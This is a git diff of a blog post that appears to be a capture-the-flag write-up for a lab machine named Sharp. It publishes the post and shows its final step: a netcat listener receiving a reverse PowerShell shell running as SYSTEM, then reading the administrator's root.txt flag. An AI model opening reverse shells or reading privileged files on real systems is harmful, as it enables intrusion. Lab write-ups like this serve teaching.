@@ -1,5 +1,5 @@
 ---
-published: false
+published: true
 ---
 <img src="https://i.ibb.co/47wNjmZ/Eo-Ud-Yp-BWMAwn3-Z2.jpg" alt="Eo-Ud-Yp-BWMAwn3-Z2" border="0">
 
@@ -192,13 +192,3 @@ published: false
 <pre><span class="line">D:\SEALED\Sharp&gt;nc.exe -lvp 4322</span><br><span class="line">listening on [any] 4322 ...</span><br><span class="line">connect to [10.10.xx.xx] from DESKTOP-9LSPC40 [10.10.10.219] 49692</span><br><span class="line">Windows PowerShell running as user SHARP$ on SHARP</span><br><span class="line">Copyright (C) 2015 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt;whoami</span><br><span class="line">nt authority\system</span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">cd</span> /users/administrator/desktop</span><br><span class="line">PS C:\users\administrator\desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\users\administrator\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                   </span><br><span class="line">----                -------------         ------ ----                                                                   </span><br><span class="line">-ar---         1/7/2021   2:17 PM             34 root.txt                                                               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\users\administrator\desktop&gt; cat root.txt</span><br><span class="line">asda4as49d5as9d59as2d9as2dasds</span><br></pre>
 
 <p>Thanks for reading i hope you enjoyed.</p>
-
-
-
-
-
-
-
-
-
-
